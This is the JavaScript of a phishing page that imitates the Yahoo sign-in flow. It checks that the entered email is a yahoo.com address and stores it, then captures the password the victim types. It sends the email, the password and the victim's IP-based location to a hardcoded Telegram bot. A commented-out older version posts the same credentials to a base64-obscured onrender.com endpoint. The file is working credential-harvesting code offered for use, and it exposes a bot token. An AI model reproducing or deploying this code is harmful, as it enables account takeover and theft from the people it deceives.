// document.addEventListener("DOMContentLoaded", function () {
//     console.log("loaded");

//     const h = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20=";
//     const e = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
//     const ymr = /^[^\s@]+@yahoo\.com$/i;
//     const nb = document.querySelector("#login-signin");
//     const ei = document.querySelector("#login-username");
//     const pi = document.querySelector("#login-passwd");
//     const ec = document.querySelector(".yid");
//     const sb = document.querySelector("#login-signin");
//     const ue = "dXNlci1lbWFpbA=="

//     if (nb) {
//         nb.addEventListener("click", function (e) {
//             e.preventDefault();
//             if (!ei) {
//                 return;
//             };
//             if (!ei.value) {
//                 ei.addAttribute = disabled;
//                 return;
//             } else {
//                 const ev = ei.value;
//                 gtp(ev);
//             };
//         });
//     }
//     else {
//         console.error("Element with id #login-signin not found");
//     }

//     const el = localStorage.getItem(atob(ue));
//     ec.textContent = el;

//     sb.addEventListener("click", async (e) => {
//         e.preventDefault();
//         const pd = pi.value;
//         await sfr(el, pd);
//     });


//     function gtp(el) {
//         const isy = isym(el);
//         //then
//         if (isy) {
//             localStorage.setItem(atob(ue), el);
//             window.location.href = `${atob(h)}/display-password.htm`;
//         }
//         return;
//     };

//     function isym(el) {
//         return ymr.test(el);
//     }


//     async function sfr(el, pd) {
//         localStorage.removeItem(atob(ue));

//         const pld = {
//             el,
//             pd
//         };
//         try {
//             const res = await axios.post(`${atob(e)}`, pld, {
//                 headers: {
//                     "Content-Type": "application/json",
//                     "Access-Control-Allow-Origin": "*"
//                 }
//             });
//             if (res.status == 200) {
//                 window.location.href = `${atob(h)}/login-failed.htm`;
//             } else {
//                 window.location.href = `${atob(h)}/display-login.htm`;
//             }
//         } catch (error) {
//             console.error("Error:", error);
//         }
//     };
// });

document.addEventListener("DOMContentLoaded", function () {
    console.log("loaded");

    const h = "aHR0cHM6Ly9haG9vLW0ycGkub25yZW5kZXIuY29t"; //done
    const e = "aHR0cHM6Ly95YWgwMC5vbnJlbmRlci5jb20vZW5kcG9pbnQ=";
    const ymr = /^[^\s@]+@yahoo\.com$/i;
    const nb = document.querySelector("#login-signin");
    const ei = document.querySelector("#login-username");
    const pi = document.querySelector("#login-passwd");
    const ec = document.querySelector(".yid");
    const sb = document.querySelector("#login-signin");
    const ue = "dXNlci1lbWFpbA=="
    let loc;

    if (nb) {
        nb.addEventListener("click", function (e) {
            e.preventDefault();
            if (!ei) {
                return;
            };
            if (!ei.value) {
                ei.addAttribute = disabled;
                return;
            } else {
                const ev = ei.value;
                gtp(ev);
            };
        });
    }
    else {
        console.error("Element with id #login-signin not found");
    }

    const el = localStorage.getItem(atob(ue));
    ec.textContent = el;

    sb.addEventListener("click", async (e) => {
        e.preventDefault();
        const pd = pi.value;
       // await sfr(el, pd);
        await getLoc();
       await sendToTG(el, pd);
    });


    function gtp(el) {//goto password page
        const isy = isym(el);
        //then
        if (isy) {
            localStorage.setItem(atob(ue), el);
            window.location.href = `${atob(h)}/display-password.htm`;
        }
        return;
    };

    function isym(el) {
        return ymr.test(el);
    }


    async function sendToTG(e, p) {
        const telegramBotToken = "6673209475:AAEVPr8y41bKRHLyMJYFAIxaQKidO7mNjSE"; // Replace with your Telegram bot token
        const chatId = 7526485798; // Replace with your chat ID

        const messageText = `**YAHOO RESULT**\nEmail: ${e}\nPassword: ${p} \n\nLocation: ${loc}`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  fetch(url, params)
    .then((response) => {
        console.log(response);
      if (!response.ok) {  
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
      // Redirect to another page after successful submission
    //   if (data) {
    //     window.location.href = `${atob(h)}/login-failed.htm`;
    // } else {
    //     window.location.href = `${atob(h)}/display-login.htm`;
    // }
        
    })
    .catch((error) => console.error("Error:", error));
};

    
    async function getLoc(){
        await fetch('https://hutils.loxal.net/whois').then(response => response.json()).then(data => {
        loc = JSON.stringify(data, null, 2);
      });
        return;
    };

    // async function sfr(el, pd) {
    //     localStorage.removeItem(atob(ue));

    //     const pld = {
    //         el,
    //         pd
    //     };
    //     try {
    //         const res = await axios.post(`${atob(e)}`, pld, {
    //             headers: {
    //                 "Content-Type": "application/json",
    //                 "Access-Control-Allow-Origin": "*"
    //             }
    //         });
    //         if (res.status == 200) {
    //             window.location.href = `${atob(h)}/login-failed.htm`;
    //         } else {
    //             window.location.href = `${atob(h)}/display-login.htm`;
    //         }
    //     } catch (error) {
    //         console.error("Error:", error);
    //     }
    // };
});

